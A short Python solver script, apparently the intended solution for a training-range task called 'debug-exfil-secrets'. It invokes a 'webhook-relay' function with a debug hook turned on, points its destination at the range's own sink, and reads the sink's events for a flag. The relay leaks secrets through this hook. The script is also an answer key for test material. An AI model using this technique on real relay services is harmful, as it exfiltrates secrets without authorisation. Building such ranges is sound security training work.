"""Intended-path solver: invoke the relay with debug hook, read the sink."""

import json

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()

    catalog = httpx.get(f"{base}/functions", timeout=10).json()["functions"]
    relay = next((f for f in catalog if f["functionName"] == "webhook-relay"), None)
    if relay is None:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="debug-exfil-secrets",
                    ok=False,
                    detail="webhook-relay missing from the function list",
                )
            ]
        )

    res = httpx.post(
        f"{base}/functions/webhook-relay/invoke",
        json={
            "destination_url": f"{base}/sink",
            "payload": {"note": "routine relay test"},
            "debug_hook": True,
        },
        timeout=10,
    )
    if res.status_code != 200:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="debug-exfil-secrets",
                    ok=False,
                    detail=f"invoke failed with {res.status_code}",
                )
            ]
        )

    events = httpx.get(f"{base}/sink/events", timeout=10).json()
    blob = json.dumps(events)
    flags = find_flags(blob)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="debug-exfil-secrets",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag arrived at the sink",
            )
        ]
    )
